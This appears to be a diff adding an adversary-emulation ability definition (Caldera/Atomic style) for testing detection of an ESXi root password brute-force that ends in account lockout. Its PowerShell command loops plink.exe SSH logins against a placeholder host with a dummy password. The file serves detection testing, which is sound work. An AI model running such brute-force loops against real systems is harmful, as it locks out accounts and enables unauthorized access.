@@ -1,0 +1,25 @@
+---
+- id: d5a972721597aa60e063bf9212edb13b
+  name: ESXi - Brute Force Until Account Lockout
+  description: 'An adversary may attempt to brute force the password of privilleged
+    account for privilege escalation.
+
+    In the process, the TA may lock the account, which can be used for detection.
+    [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1110.001
+    name: 'Brute Force: Password Guessing'
+  platforms:
+    windows:
+      psh:
+        command: $lockout_threshold = [int]"5"; for ($var = 1; $var -le $lockout_threshold;
+          $var++) {;   PathToAtomicsFolder\..\ExternalPayloads\plink.exe -ssh "atomic.local"
+          -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002;   }
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
